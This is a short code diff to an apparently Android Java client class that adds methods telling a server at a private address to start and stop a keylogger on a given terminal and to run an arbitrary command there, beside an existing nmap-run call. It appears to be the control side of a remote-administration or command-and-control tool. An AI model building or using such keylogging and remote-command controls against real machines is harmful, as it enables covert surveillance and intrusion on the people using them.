@@ -86,6 +86,31 @@ public class TerminalHttp implements Httpimpl {
         return sendPostHtpp("http://10.59.13.137:8080/runnmap", map);
     }
 
+    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+    @Override
+    public String sendStartKeyLogger(String terminalID) {
+        Map<String, String> map = new HashMap<>();
+        map.put("terminalid", terminalID);
+        return sendPostHtpp("http://10.59.13.137:8080/startKeyLogger", map);
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+    @Override
+    public String sendEndKeyLogger(String terminalID) {
+        Map<String, String> map = new HashMap<>();
+        map.put("terminalid", terminalID);
+        return sendPostHtpp("http://10.59.13.137:8080/overKeyLogger", map);
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+    @Override
+    public String execCmdCommand(String terminalID, String msg) {
+        Map<String, String> map = new HashMap<>();
+        map.put("terminalid", terminalID);
+        map.put("msg", msg);
+        return sendPostHtpp("http://10.59.13.137:8080/execCmdCommand", map);
+    }
+
 
     @RequiresApi(api = Build.VERSION_CODES.KITKAT)
     public static void main(String[] args) {
